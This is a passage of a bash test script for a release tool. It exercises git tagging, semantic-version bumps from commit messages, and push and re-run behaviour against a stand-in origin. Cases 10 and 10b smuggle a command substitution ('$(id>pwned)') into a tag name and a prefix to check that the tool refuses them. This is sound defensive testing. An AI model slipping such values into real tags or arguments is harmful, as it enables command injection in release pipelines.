  "$(contains "$(cat "$work/c8d/summary.md" 2>/dev/null)" 'DEPLOY_KEY.*The release itself succeeded')"
check "no DEPLOY_KEY: origin/main is untouched" "$(is "$(origin_version "$work/c8d")" 1.0.0)"
check "no DEPLOY_KEY: nothing is made in TMPDIR" "$(is "$left" 0)"
push_main "$work/c8d/b" 1.0.1 "$work/c8d/summary.md" GITHUB_REPOSITORY=
check "no GITHUB_REPOSITORY: exits non-zero, naming it, and says the release itself succeeded" \
  "$([ "$rc" != 0 ] && is "$(contains "$out" '^::error::GITHUB_REPOSITORY.*The release itself succeeded')|$left" 'true|0' || echo false)"
# HEAD:refs/heads/main serves a detached HEAD and a branch alike (a release job
# may check out either); the pre-push checks (cases 2 to 2f) are what keep
# everything but the exact bump off main.
setup "$work/c8e"
git -C "$work/c8e/b" checkout -q --detach
bump "$work/c8e/b" 1.0.1
push_main "$work/c8e/b" 1.0.1
check "a detached HEAD: exits 0" "$(is "$rc" 0)"
check "a detached HEAD: origin/main holds the bump" "$(is "$(origin_version "$work/c8e")" 1.0.1)"
check "a detached HEAD: origin/main's tip is the bump commit" \
  "$(is "$(git -C "$work/c8e/origin.git" rev-parse main)" "$(git -C "$work/c8e/b" rev-parse HEAD)")"
# The manifest already held the version, so `tag` committed nothing and HEAD is main's tip.
setup "$work/c8f"
record_hook "$work/c8f/origin.git"
push_main "$work/c8f/b" 1.0.0
check "HEAD already on main: exits 0" "$(is "$rc" 0)"
check "HEAD already on main: says there is nothing to push" "$(contains "$out" '^Nothing to push: main already holds this checkout$')"
check "HEAD already on main: nothing was pushed" "$(is "$seen" "")"
check "HEAD already on main: origin/main is unchanged" \
  "$(is "$(git -C "$work/c8f/origin.git" rev-parse main)" "$(git -C "$work/c8f/b" rev-parse HEAD)")"

echo
echo "Case 9: tagged finds the tag an earlier attempt pushed for this checkout, and only that"
setup "$work/c9"
clone="$work/c9/a"
seed=$(git -C "$clone" rev-parse HEAD)
tagged "$clone" pkg-v packages/pkg
check "no tag: exits 0" "$(is "$rc" 0)"
check "no tag: prints nothing" "$(is "$out" "")"
# What one release run leaves: its bump commit, a child of the checkout, tagged.
bump "$clone" 1.0.1
git -C "$clone" tag pkg-v1.0.1
# Another package's release from the same checkout: a sibling bump, tagged with its own prefix.
git -C "$clone" checkout -q --detach "$seed"
mkdir -p "$clone/packages/other"
printf '{\n  "name": "other",\n  "version": "2.0.1"\n}\n' > "$clone/packages/other/package.json"
git -C "$clone" add -A
git -C "$clone" commit -q -m "chore: release other v2.0.1 [skip ci]"
git -C "$clone" tag other-v2.0.1
git -C "$clone" checkout -q --detach "$seed"
tagged "$clone" pkg-v packages/pkg
check "the tag on HEAD's bump commit: printed" "$(is "$out" pkg-v1.0.1)"
tagged "$clone" pkg-v
check "without a package dir, a tag on HEAD's bump commit is not this checkout's" "$(is "$rc $out" "0 ")"
tagged "$clone" other-v packages/other
check "each prefix finds its own package's tag" "$(is "$out" other-v2.0.1)"
# A later release: main moves past the first bump, and the next run tags its own bump.
git -C "$clone" checkout -q --detach pkg-v1.0.1
printf 'later\n' > "$clone/README.md"
git -C "$clone" commit -q -am "fix: later change"
later=$(git -C "$clone" rev-parse HEAD)
bump "$clone" 1.0.2
git -C "$clone" tag pkg-v1.0.2
git -C "$clone" checkout -q --detach "$seed"
tagged "$clone" pkg-v packages/pkg
check "a later release on a descendant is not this checkout's" "$(is "$out" pkg-v1.0.1)"
git -C "$clone" checkout -q --detach "$later"
tagged "$clone" pkg-v packages/pkg
check "the later run's checkout finds its own tag" "$(is "$out" pkg-v1.0.2)"
# A tag on a child of HEAD that changes more than the manifest is not a bump commit.
git -C "$clone" checkout -q --detach "$seed"
printf 'not a bump\n' > "$clone/README.md"
jq '.version = "1.0.9"' "$clone/packages/pkg/package.json" > "$clone/tmp.json" \
  && mv "$clone/tmp.json" "$clone/packages/pkg/package.json"
git -C "$clone" commit -q -am "feat: a child that is not a bump"
git -C "$clone" tag pkg-v1.0.9
git -C "$clone" checkout -q --detach "$seed"
tagged "$clone" pkg-v packages/pkg
check "a tagged child changing another file is skipped" "$(is "$out" pkg-v1.0.1)"
# The manifest already held the version, so `tag` tagged HEAD itself.
git -C "$work/c9/b" tag pkg-v1.0.0
tagged "$work/c9/b" pkg-v packages/pkg
check "a tag on HEAD itself: printed" "$(is "$out" pkg-v1.0.0)"
# A job that tags the commit it checked out (legion, the Envoy listener) passes no package dir.
tagged "$work/c9/b" pkg-v
check "without a package dir, a tag on HEAD itself: printed" "$(is "$out" pkg-v1.0.0)"

echo
echo "Case 10: tagged refuses a release tag whose name is not <prefix>X.Y.Z"
setup "$work/c10"
clone="$work/c10/a"
seed=$(git -C "$clone" rev-parse HEAD)
bump "$clone" 1.0.1
# shellcheck disable=SC2016 # literal $(…): git accepts it in a tag name
git -C "$clone" tag 'pkg-v1.0.1$(id>pwned)'
git -C "$clone" checkout -q --detach "$seed"
tagged "$clone" pkg-v packages/pkg
check "a command substitution on the bump commit: exits 1" "$(is "$rc" 1)"
check "a command substitution on the bump commit: prints no tag" "$(is "$out" "")"
check "a command substitution on the bump commit: the error names the tag" "$(contains "$err" '^::error::release-push.sh tagged: pkg-v1\.0\.1.*id.*pwned.*, the release tag for this checkout, is not pkg-vX\.Y\.Z; refusing it$')"
check "a command substitution on the bump commit: nothing in it ran" "$([ ! -e "$clone/pwned" ] && echo true || echo false)"
# shellcheck disable=SC2016 # literal $(…), the tag's name
git -C "$clone" tag -d 'pkg-v1.0.1$(id>pwned)' >/dev/null
git -C "$clone" tag pkg-v1.0.0-rc.1
tagged "$clone" pkg-v packages/pkg
check "a pre-release on HEAD: exits 1" "$(is "$rc" 1)"
check "a pre-release on HEAD: prints no tag" "$(is "$out" "")"
check "a pre-release on HEAD: the error names the tag" "$(contains "$err" '^::error::release-push.sh tagged: pkg-v1\.0\.0-rc\.1, the release tag for this checkout, is not pkg-vX\.Y\.Z; refusing it$')"
git -C "$clone" tag -d pkg-v1.0.0-rc.1 >/dev/null
# A leading zero, which release-bump.sh's arithmetic would read as octal.
for name in pkg-v1.010.0 pkg-v01.0.0; do
  git -C "$clone" tag "$name"
  tagged "$clone" pkg-v
  check "a leading zero on HEAD ($name), no package dir: exits 1" "$(is "$rc" 1)"
  check "a leading zero on HEAD ($name), no package dir: prints no tag" "$(is "$out" "")"
  check "a leading zero on HEAD ($name), no package dir: the error names the tag" "$(contains "$err" "^::error::release-push.sh tagged: ${name//./\\.}, the release tag for this checkout, is not pkg-vX\.Y\.Z; refusing it$")"
  git -C "$clone" tag -d "$name" >/dev/null
done
git -C "$clone" tag pkg-v1.0.0
tagged "$clone" pkg-v
check "a zero field is plain: pkg-v1.0.0 on HEAD, no package dir, printed" "$(is "$rc $out" "0 pkg-v1.0.0")"
git -C "$clone" tag -d pkg-v1.0.0 >/dev/null
# Git refuses a tag name holding a space or a newline, and ignores a ref file
# forged with one, so `tagged` is never handed either.
for name in 'pkg-v1.0.2 x' $'pkg-v1.0.2\nx'; do
  printf -v shown '%q' "$name"
  check "git refuses to create the tag $shown" "$(git -C "$clone" tag "$name" 2>/dev/null && echo false || echo true)"
  printf '%s\n' "$seed" > "$clone/.git/refs/tags/$name"
done
tagged "$clone" pkg-v packages/pkg
check "forged refs with a space and a newline: exits 0" "$(is "$rc" 0)"
check "forged refs with a space and a newline: prints no tag" "$(is "$out" "")"
check "forged refs with a space and a newline: git ignores both" "$(is "$(printf '%s\n' "$err" | { grep -c '^warning: ignoring ref with broken name refs/tags/pkg-v1\.0\.2' || true; })" 2)"

echo
echo "Case 10b: version releases the tag an earlier attempt pushed, else the bump since the newest tag"
# The stub npm, first on PATH. It logs each call to $NPM_TEST_DIR/npm-calls as
# one line, each argument in brackets, answers with $NPM_TEST_VERSION, and fails
# as npm does for a package it does not have when $NPM_TEST_FAIL is set.
mkdir -p "$work/bin"
cat > "$work/bin/npm" <<'NPM'
#!/usr/bin/env bash
{ printf '[%s]' "$@"; printf '\n'; } >> "$NPM_TEST_DIR/npm-calls"
[ -z "${NPM_TEST_FAIL:-}" ] || { echo "npm ERR! 404 Not Found" >&2; exit 1; }
echo "$NPM_TEST_VERSION"
NPM
chmod +x "$work/bin/npm"
# version_run <clone> <arg>...: runs `release-push.sh version <arg>...` from
# <clone>, with the job summary at $work/version.summary and the stub npm's log
# emptied first; leaves its exit code in rc, its stdout (the output lines) in
# out, its stderr in err, the summary in summary_md and npm's calls in npm_calls.
version_run() {
  local clone=$1
  shift
  : > "$work/version.summary"
  : > "$work/npm-calls"
  set +e
  out=$(cd "$clone" && GITHUB_STEP_SUMMARY="$work/version.summary" NPM_TEST_DIR="$work" \
    PATH="$work/bin:$PATH" "$release_push" version "$@" 2>"$work/version.err")
  rc=$?
  set -e
  err=$(<"$work/version.err")
  summary_md=$(<"$work/version.summary")
  npm_calls=$(<"$work/npm-calls")
}
# outputs <version> <tag> <skip>: the three lines `version` prints, as is compares them.
outputs() { printf 'version=%s\ntag=%s\nskip=%s' "$@"; }
setup "$work/v"
clone="$work/v/a"
seed=$(git -C "$clone" rev-parse HEAD)
git -C "$clone" tag pkg-v1.0.0
version_run "$clone" pkg-v -- packages/pkg/
check "a tag on HEAD: exits 0" "$(is "$rc" 0)"
check "a tag on HEAD: prints its version, the tag and skip=false, nothing else" "$(is "$out" "$(outputs 1.0.0 pkg-v1.0.0 false)")"
check "a tag on HEAD: says it was already pushed" "$(contains "$err" '^Releasing pkg-v1\.0\.0, already pushed for this checkout$')"
# What one release run leaves (case 9): its bump commit, a child of the checkout, tagged.
bump "$work/v/b" 1.0.1
git -C "$work/v/b" tag pkg-v1.0.1
git -C "$work/v/b" checkout -q --detach "$seed"
version_run "$work/v/b" pkg-v --package-dir packages/pkg -- packages/pkg/
check "a tag on HEAD's bump commit, with the package dir: that tag's version" "$(is "$rc $out" "0 $(outputs 1.0.1 pkg-v1.0.1 false)")"
version_run "$work/v/b" pkg-v -- packages/pkg/
check "the same without the package dir: the newest tag is on a descendant, so nothing is since it" "$(is "$rc $out" "0 $(outputs '' '' true)")"
# Commits since the tag, each kind from the tagged commit.
change "$clone" packages/pkg/index.js "feat: add an export"
feat=$(git -C "$clone" rev-parse HEAD)
version_run "$clone" pkg-v -- packages/pkg/
check "a feat: commit since the tag: exits 0" "$(is "$rc" 0)"
check "a feat: commit since the tag: bumps minor" "$(is "$out" "$(outputs 1.1.0 pkg-v1.1.0 false)")"
check "a feat: commit since the tag: logs the bump" "$(contains "$err" '^Bumping pkg-v1\.0\.0 -> pkg-v1\.1\.0$')"
git -C "$clone" checkout -q --detach pkg-v1.0.0
change "$clone" packages/pkg/index.js "fix: a bug"
fix=$(git -C "$clone" rev-parse HEAD)
version_run "$clone" pkg-v -- packages/pkg/
check "a fix: commit since the tag: bumps patch" "$(is "$rc $out" "0 $(outputs 1.0.1 pkg-v1.0.1 false)")"
git -C "$clone" checkout -q --detach pkg-v1.0.0
change "$clone" packages/pkg/README.md "docs: explain it"
docs=$(git -C "$clone" rev-parse HEAD)
version_run "$clone" pkg-v -- packages/pkg/
check "a docs: commit alone: exits 0, skipping, with an empty version and tag" "$(is "$rc $out" "0 $(outputs '' '' true)")"
check "a docs: commit alone: the notice names the tag" "$(contains "$err" '^::notice title=No release published::No version-bumping commits since pkg-v1\.0\.0$')"
check "a docs: commit alone: the job summary says the same" "$(is "$summary_md" '**No release published** — No version-bumping commits since pkg-v1.0.0')"
git -C "$clone" checkout -q --detach pkg-v1.0.0
change "$clone" README.md "feat: elsewhere in the repository"
version_run "$clone" pkg-v -- packages/pkg/
check "a commit outside the paths: exits 0, skipping" "$(is "$rc $out" "0 $(outputs '' '' true)")"
check "a commit outside the paths: says so plainly" "$(contains "$err" "^No commits in the release's paths since pkg-v1\.0\.0$")"
check "a commit outside the paths: no notice, no job summary" "$(is "$(contains "$err" '::notice')|$summary_md" 'false|')"
git -C "$clone" checkout -q --detach pkg-v1.0.0
change "$clone" docs/guide.md "docs: a guide the package ships"
version_run "$clone" pkg-v --patch-path docs/ -- packages/pkg/ docs/
check "a docs: commit on a --patch-path: bumps patch" "$(is "$rc $out" "0 $(outputs 1.0.1 pkg-v1.0.1 false)")"
# A first release: no tag of the prefix anywhere (origin never got one).
git clone -q "$work/v/origin.git" "$work/v/c"
identity "$work/v/c"
change "$work/v/c" packages/pkg/index.js "fix: a bug"
NPM_TEST_VERSION=2.3.4 version_run "$work/v/c" pkg-v --first-npm @example/pkg -- packages/pkg/
check "no tag, --first-npm: exits 0" "$(is "$rc" 0)"
check "no tag, --first-npm: bumps npm's version over the whole history" "$(is "$out" "$(outputs 2.3.5 pkg-v2.3.5 false)")"
check "no tag, --first-npm: asked npm for the package's version" "$(is "$npm_calls" '[view][@example/pkg][version]')"
check "no tag, --first-npm: logs the bump from npm's version" "$(contains "$err" '^Bumping v2\.3\.4 -> pkg-v2\.3\.5$')"
NPM_TEST_FAIL=1 version_run "$work/v/c" pkg-v --first-npm @example/pkg -- packages/pkg/
check "no tag, npm has no such package: starts from 0.0.0" "$(is "$rc $out" "0 $(outputs 0.0.1 pkg-v0.0.1 false)")"
version_run "$work/v/c" pkg-v -- packages/pkg/
check "no tag, no --first-npm: exits 1 printing nothing" "$(is "$rc|$out" "1|")"
check "no tag, no --first-npm: the error says a release line starts from a tag" \
  "$(contains "$err" '^::error::release-push.sh version: no pkg-v\* tag; a release line starts from a tag (push pkg-v0\.0\.0 on the commit before its first release)$')"
# --expect: what the build job handed against what the tags give now. Another
# run that took the tag first leaves nothing on stdout, no ::error:: and one
# ::notice, and exits 3 when nothing of this checkout is left to release or 4
# when its commits still need a release.
git -C "$clone" checkout -q --detach "$fix"
version_run "$clone" pkg-v --expect 1.0.1 -- packages/pkg/
check "--expect, the tags agree: exits 0 with the three lines" "$(is "$rc $out" "0 $(outputs 1.0.1 pkg-v1.0.1 false)")"
git -C "$clone" checkout -q --detach "$feat"
version_run "$clone" pkg-v --expect 1.0.1 -- packages/pkg/
check "--expect, the tags give another version: exits 4 printing nothing" "$(is "$rc|$out" "4|")"
check "--expect, the tags give another version: the notice names both and says a new run must build them" \
  "$(contains "$err" '^::notice title=Version taken by another run::release-push\.sh version: the build job handed v1\.0\.1; the tags now give 1\.1\.0: another run took the tag first, and this checkout holds commits no release holds yet, so a new run must compute the version again and build them$')"
check "--expect, the tags give another version: no error, no bump logged" "$(is "$(contains "$err" '::error')|$(contains "$err" 'Bumping')" 'false|false')"
git -C "$clone" checkout -q --detach "$docs"
version_run "$clone" pkg-v --expect 1.0.1 -- packages/pkg/
check "--expect where there is nothing to release: exits 3 printing nothing" "$(is "$rc|$out" "3|")"
check "--expect where there is nothing to release: the notice says nothing is left" \
  "$(contains "$err" '^::notice title=Nothing left to release::release-push\.sh version: the build job handed v1\.0\.1; the tags now give nothing to release: another run took the tag first, and nothing of this checkout is left to release$')"
check "--expect where there is nothing to release: no error, no other notice, no job summary" \
  "$(is "$(contains "$err" '::error')|$(contains "$err" 'No release published')|$summary_md" 'false|false|')"
# Two fixes land on pkg-v1.0.0. The first two shapes are two overlapping runs
# whose build jobs both handed 1.0.1 before either published; the third is two
# runs of one commit, the other run deciding after a third run's release.
git -C "$clone" checkout -q --detach pkg-v1.0.0
change "$clone" packages/pkg/index.js "fix: the first bug"
first=$(git -C "$clone" rev-parse HEAD)
change "$clone" packages/pkg/index.js "fix: the second bug"
second=$(git -C "$clone" rev-parse HEAD)
# The first fix's run published first: the second's commit is in no release.
git -C "$clone" tag pkg-v1.0.1 "$first"
version_run "$clone" pkg-v --expect 1.0.1 -- packages/pkg/
check "--expect, another run tagged an ancestor first: exits 4, the tags giving 1.0.2" \
  "$(is "$rc|$out|$(contains "$err" 'the tags now give 1\.0\.2: another run took the tag first, and this checkout holds commits no release holds yet')" '4||true')"
# Another run tagged an ancestor first, but the version is still the one handed:
# a feat: since pkg-v1.0.1 gives 1.1.0 as a feat: since pkg-v1.0.0 did.
change "$clone" packages/pkg/index.js "feat: an export after the second fix"
version_run "$clone" pkg-v --expect 1.1.0 -- packages/pkg/
check "--expect, another run tagged an ancestor but the version handed is still next: exits 0 with the three lines" \
  "$(is "$rc $out" "0 $(outputs 1.1.0 pkg-v1.1.0 false)")"
# The second fix's run published first: its release holds the first fix too.
git -C "$clone" tag -d pkg-v1.0.1 >/dev/null
git -C "$clone" tag pkg-v1.0.1 "$second"
git -C "$clone" checkout -q --detach "$first"
version_run "$clone" pkg-v --expect 1.0.1 -- packages/pkg/
check "--expect, another run tagged a descendant first: exits 3, nothing left to release" \
  "$(is "$rc|$out|$(contains "$err" 'the tags now give nothing to release: another run took the tag first, and nothing of this checkout is left to release')" '3||true')"
# A run on this very commit published another version first.
git -C "$clone" tag -d pkg-v1.0.1 >/dev/null
git -C "$clone" tag pkg-v1.0.2 "$first"
version_run "$clone" pkg-v --expect 1.0.1 -- packages/pkg/
check "--expect, another run tagged this checkout with another version: exits 3 printing nothing" "$(is "$rc|$out" '3|')"
check "--expect, another run tagged this checkout with another version: the notice names its tag" \
  "$(contains "$err" '^::notice title=Released by another run::release-push\.sh version: the build job handed v1\.0\.1; another run took the tag first and released this checkout as pkg-v1\.0\.2$')"
version_run "$clone" pkg-v --expect 1.0.2 -- packages/pkg/
check "--expect, the tag on this checkout is the version handed: exits 0, releasing it again" \
  "$(is "$rc|$out|$(contains "$err" '^Releasing pkg-v1\.0\.2, already pushed for this checkout$')" "0|$(outputs 1.0.2 pkg-v1.0.2 false)|true")"
git -C "$clone" tag -d pkg-v1.0.2 >/dev/null
# Refusals, each printing nothing.
git -C "$clone" checkout -q --detach "$feat"
git -C "$clone" tag pkg-v1.0.0-rc.1 "$seed"
version_run "$clone" pkg-v -- packages/pkg/
check "a pre-release as the newest tag: exits 2 printing nothing" "$(is "$rc|$out" "2|")"
check "a pre-release as the newest tag: release-bump.sh's refusal names it" \
  "$(contains "$err" '^::error::release-bump.sh: previous version 1\.0\.0-rc\.1 (range pkg-v1\.0\.0-rc\.1\.\.HEAD) is not a plain X\.Y\.Z version; refusing it$')"
version_run "$clone" pkg-v --expect 1.0.1 -- packages/pkg/
check "a pre-release as the newest tag, with --expect: exits 2, never 3 or 4, and says nothing of another run" \
  "$(is "$rc|$out|$(contains "$err" '::notice title=')" '2||false')"
git -C "$clone" tag -d pkg-v1.0.0-rc.1 >/dev/null
# A release-bump.sh that fails with a status --expect's caller reads as another run's tag (GNU
# sed, which it pipes into, exits 4 on an I/O error) fails the version step with 1 instead.
mkdir -p "$work/bump4"
cp "$release_push" "$work/bump4/release-push.sh"
printf '%s\n' '#!/usr/bin/env bash' 'echo "sed: couldn'"'"'t flush stdout: No space left on device" >&2' 'exit 4' > "$work/bump4/release-bump.sh"
chmod +x "$work/bump4/release-bump.sh"
set +e
out=$(cd "$clone" && "$work/bump4/release-push.sh" version pkg-v --expect 1.0.1 -- packages/pkg/ 2>"$work/version.err")
rc=$?
set -e
check "a release-bump.sh that exits 4: version --expect exits 1, never 4, printing nothing" "$(is "$rc|$out" '1|')"
version_run "$clone" 'pkg v' -- packages/pkg/
check "a prefix with a space: exits 2 printing nothing" "$(is "$rc|$out" "2|")"
check "a prefix with a space: the error names it" "$(contains "$err" '^::error::release-push.sh version: tag prefix pkg\\ v holds more than letters, digits')"
# shellcheck disable=SC2016 # literal $(…), the prefix under test
version_run "$clone" 'pkg-v$(id>pwned)' -- packages/pkg/
check "a prefix with a command substitution: exits 2 printing nothing" "$(is "$rc|$out" "2|")"
check "a prefix with a command substitution: the error names it" "$(contains "$err" '^::error::release-push.sh version: tag prefix pkg-v.*id.*pwned.* holds more than')"
check "a prefix with a command substitution: nothing in it ran" "$([ ! -e "$clone/pwned" ] && echo true || echo false)"
version_run "$clone" pkg-v --expect abc -- packages/pkg/
check "--expect abc: exits 2 printing nothing" "$(is "$rc|$out" "2|")"
check "--expect abc: the error names it" "$(contains "$err" '^::error::release-push.sh version: --expect abc is not X\.Y\.Z')"
version_run "$clone" pkg-v --bogus -- packages/pkg/
check "an unknown option: exits 2 printing nothing, with the usage" "$(is "$rc|$out|$(contains "$err" '^::error::release-push.sh version: unknown option --bogus; usage: release-push.sh version ')" "2||true")"

echo
echo "Case 10c: tag commits the bump and tags it locally, pushing nothing"
# tag_run <clone> <version> <tag> [<package-dir> <name>]: sets the manifest's
# version as the workflow does before `tag`, then runs `release-push.sh tag`
# from <clone>; <package-dir> and <name> default to packages/pkg and pkg.
# Leaves its exit code in rc and its combined output in out.
tag_run() {
  local clone=$1 v=$2 tag=$3 package_dir=${4:-packages/pkg} name=${5:-pkg}
  set_version "$clone" "$v" "$package_dir"
  set +e
  out=$(cd "$clone" && "$release_push" tag "$package_dir" "chore: release $name v$v [skip ci]" "$tag" 2>&1)
  rc=$?
  set -e
}
setup "$work/t"
clone="$work/t/a"
tag_run "$clone" 1.0.1 pkg-v1.0.1
check "tags: exits 0" "$(is "$rc" 0)"
check "tags: the clone has the bump commit" "$(is "$(git -C "$clone" log -1 --format=%s)" "chore: release pkg v1.0.1 [skip ci]")"
check "tags: the tag is on it" "$(is "$(git -C "$clone" rev-parse 'pkg-v1.0.1^{commit}')" "$(git -C "$clone" rev-parse HEAD)")"
check "tags: origin has no tag" "$(is "$(git -C "$work/t/origin.git" tag -l)" "")"
check "tags: origin/main is untouched" "$(is "$(origin_version "$work/t")" 1.0.0)"
tag_run "$clone" 1.0.1 pkg-v1.0.1
check "the same version again: exits 0, reusing the tag" "$(is "$rc|$(contains "$out" '^Tag pkg-v1\.0\.1 already exists for version 1\.0\.1; reusing it$')" '0|true')"
check "the same version again: still nothing on origin" "$(is "$(git -C "$work/t/origin.git" tag -l)" "")"
tag_run "$clone" 1.0.2 pkg-v1.0.1
check "another version under the existing tag: exits 1 naming both versions" \
  "$(is "$rc|$(contains "$out" '^::error::tag pkg-v1\.0\.1 already exists with version 1\.0\.1, not 1\.0\.2$')" '1|true')"

echo
echo "Case: one publish job releases two packages from the run's commit"
# release.yaml's publish job releases its packages one after another from one checkout, each from
# the run's commit: `git checkout --force --detach "$GITHUB_SHA"` and `git clean -ffdx`, then "Set
# release version", `tag`, `push-tag` and `push-main`, here each through the script under test
# against a bare origin standing in for GitHub. The run's commit R holds a fix for each of two
# packages, pkg and other: pkg's bump lands on R as it is, other's is rebased onto it, and each tag
# stays on its own un-rebased bump commit, a child of R, where a re-run's version step finds it. A
# re-run repeats every step and changes nothing on origin. The same re-run without the detach
# between the packages is the control: pkg's push-main pushes nothing (main holds 1.0.1), so pkg's
# re-made bump commit stays off main, other's `tag` commits on top of it, and other's push-main
# refuses a HEAD two commits over main. Each re-run's bump is committed at a fixed earlier date, as
# in case 7, so it is a commit of its own, as a re-run's is.
pj="$work/pj"
setup "$pj"
git -C "$pj/a" tag pkg-v1.0.0
mkdir -p "$pj/a/packages/other"
printf '{\n  "name": "other",\n  "version": "2.0.0"\n}\n' > "$pj/a/packages/other/package.json"
git -C "$pj/a" add -A
git -C "$pj/a" commit -q -m "feat: add other"
git -C "$pj/a" tag other-v2.0.0
change "$pj/a" packages/pkg/index.js "fix: a bug in pkg"
change "$pj/a" packages/other/index.js "fix: a bug in other"
run=$(git -C "$pj/a" rev-parse HEAD)
git -C "$pj/a" push -q --tags origin main
record_hook "$pj/origin.git"
# from_run <clone>: what each package's hand-over check does first, putting <clone> back on the
# run's commit.
from_run() {
  git -C "$1" checkout -q --force --detach "$run"
  git -C "$1" clean -q -ffdx
}
# publish_package <clone> <package-dir> <name> <version> <tag>: one package's steps after its
# hand-over check, from wherever <clone>'s HEAD is: "Set release version", `tag`, `push-tag` and
# `push-main`, stopping at the first that fails. Leaves the failed step's name in failed (empty
# when every step succeeded), the output of `tag` in tag_out, rc and out from the last step run,
# and in pushed how many of its pushes reached origin.
publish_package() {
  local clone=$1 package_dir=$2 name=$3 v=$4 tag=$5
  failed='' pushed=0
  tag_run "$clone" "$v" "$tag" "$package_dir" "$name"
  tag_out=$out
  [ "$rc" = 0 ] || { failed=tag; return 0; }
  deploy_run "$clone" GITHUB_STEP_SUMMARY= -- push-tag "$tag"
  [ -z "$seen" ] || pushed=$((pushed + 1))
  [ "$rc" = 0 ] || { failed=push-tag; return 0; }
  deploy_run "$clone" GITHUB_STEP_SUMMARY= -- push-main "$package_dir" "$v"
  [ -z "$seen" ] || pushed=$((pushed + 1))
  [ "$rc" = 0 ] || failed=push-main
}
# only_version <repo> <commit> <package-dir> <version>: true when <commit>'s manifest is its
# parent's with .version set to <version> and nothing else, as JSON.
only_version() {
  local repo=$1 commit=$2 manifest=$3/package.json v=$4
  is "$(git -C "$repo" show "$commit^:$manifest" | jq -S --arg v "$v" '.version = $v')" \
    "$(git -C "$repo" show "$commit:$manifest" | jq -S .)"
}
# origin_refs: every ref origin holds, with the object it names.
origin_refs() { git -C "$pj/origin.git" for-each-ref --format='%(refname) %(objectname)'; }
o="$pj/origin.git"
pkg_subject="chore: release pkg v1.0.1 [skip ci]"
other_subject="chore: release other v2.0.1 [skip ci]"

# The run: its build jobs read the version from the run's commit, then publish releases both.
git clone -q "$o" "$pj/job"
version_run "$pj/job" pkg-v --package-dir packages/pkg -- packages/pkg/
check "the build of pkg: releases 1.0.1" "$(is "$rc $out" "0 $(outputs 1.0.1 pkg-v1.0.1 false)")"
version_run "$pj/job" other-v --package-dir packages/other -- packages/other/
check "the build of other: releases 2.0.1" "$(is "$rc $out" "0 $(outputs 2.0.1 other-v2.0.1 false)")"
from_run "$pj/job"
publish_package "$pj/job" packages/pkg pkg 1.0.1 pkg-v1.0.1
check "first attempt, pkg: every step succeeds, its tag and its bump each pushed" "$(is "$failed|$pushed" "|2")"
from_run "$pj/job"
publish_package "$pj/job" packages/other other 2.0.1 other-v2.0.1
check "first attempt, other: every step succeeds, its tag and its bump each pushed" "$(is "$failed|$pushed" "|2")"
pkg_bump=$(git -C "$o" rev-parse -q --verify 'pkg-v1.0.1^{commit}' || true)
other_bump=$(git -C "$o" rev-parse -q --verify 'other-v2.0.1^{commit}' || true)
check "first attempt: main holds pkg's bump, then other's, over the run's commit" \
  "$(is "$(git -C "$o" log --format=%s "$run..main")|$(git -C "$o" rev-parse main~2)" "$other_subject"$'\n'"$pkg_subject|$run")"
check "first attempt: main's pkg bump changes only packages/pkg/package.json's .version" \
  "$(is "$(git -C "$o" diff --name-only main~2 main~1)|$(only_version "$o" main~1 packages/pkg 1.0.1)" "packages/pkg/package.json|true")"
check "first attempt: main's other bump, rebased onto pkg's, changes only packages/other/package.json's .version" \
  "$(is "$(git -C "$o" diff --name-only main~1 main)|$(only_version "$o" main packages/other 2.0.1)" "packages/other/package.json|true")"
check "first attempt: pkg's tag names its bump commit, a child of the run's commit, which main carries as it is" \
  "$(is "$(git -C "$o" rev-parse "$pkg_bump^")|$pkg_bump" "$run|$(git -C "$o" rev-parse main~1)")"
check "first attempt: other's tag names its un-rebased bump commit, a child of the run's commit, not main's rebased one" \
  "$(is "$(git -C "$o" rev-parse "$other_bump^")|$([ "$other_bump" != "$(git -C "$o" rev-parse main)" ] && echo apart)" "$run|apart")"
check "first attempt: other's tagged bump changes only packages/other/package.json's .version" \
  "$(is "$(git -C "$o" diff --name-only "$run" "$other_bump")|$(only_version "$o" "$other_bump" packages/other 2.0.1)" "packages/other/package.json|true")"
refs=$(origin_refs)

# A re-run: the same commit, with every tag the first attempt pushed.
git clone -q "$o" "$pj/rerun"
git -C "$pj/rerun" checkout -q --detach "$run"
git -C "$pj/rerun" fetch -q --tags origin
version_run "$pj/rerun" pkg-v --package-dir packages/pkg -- packages/pkg/
check "re-run, the build of pkg: releases pkg-v1.0.1 again" \
  "$(is "$rc|$out|$(contains "$err" '^Releasing pkg-v1\.0\.1, already pushed for this checkout$')" "0|$(outputs 1.0.1 pkg-v1.0.1 false)|true")"
version_run "$pj/rerun" other-v --package-dir packages/other -- packages/other/
check "re-run, the build of other: releases other-v2.0.1 again" \
  "$(is "$rc|$out|$(contains "$err" '^Releasing other-v2\.0\.1, already pushed for this checkout$')" "0|$(outputs 2.0.1 other-v2.0.1 false)|true")"
from_run "$pj/rerun"
GIT_AUTHOR_DATE="2001-01-01T00:00:00Z" GIT_COMMITTER_DATE="2001-01-01T00:00:00Z" \
  publish_package "$pj/rerun" packages/pkg pkg 1.0.1 pkg-v1.0.1
check "re-run, pkg: every step succeeds, no push reaching origin" "$(is "$failed|$pushed" "|0")"
check "re-run, pkg: tag reuses its own tag" "$(contains "$tag_out" '^Tag pkg-v1\.0\.1 already exists for version 1\.0\.1; reusing it$')"
check "re-run, pkg: push-main says main already holds the version" \
  "$(contains "$out" "^::notice title=Version bump not pushed::main's packages/pkg/package\.json already holds v1\.0\.1")"
from_run "$pj/rerun"
GIT_AUTHOR_DATE="2001-01-01T00:00:00Z" GIT_COMMITTER_DATE="2001-01-01T00:00:00Z" \
  publish_package "$pj/rerun" packages/other other 2.0.1 other-v2.0.1
check "re-run, other: every step succeeds, no push reaching origin" "$(is "$failed|$pushed" "|0")"
check "re-run, other: tag reuses its own tag" "$(contains "$tag_out" '^Tag other-v2\.0\.1 already exists for version 2\.0\.1; reusing it$')"
check "re-run, other: push-main says main already holds the version" \
  "$(contains "$out" "^::notice title=Version bump not pushed::main's packages/other/package\.json already holds v2\.0\.1")"
check "re-run: origin's main and tags are unchanged" "$(is "$(origin_refs)" "$refs")"

# The control: the same re-run from one clone, without the detach between the packages.
git clone -q "$o" "$pj/control"
git -C "$pj/control" checkout -q --detach "$run"
git -C "$pj/control" fetch -q --tags origin
from_run "$pj/control"
GIT_AUTHOR_DATE="2001-01-01T00:00:00Z" GIT_COMMITTER_DATE="2001-01-01T00:00:00Z" \
  publish_package "$pj/control" packages/pkg pkg 1.0.1 pkg-v1.0.1
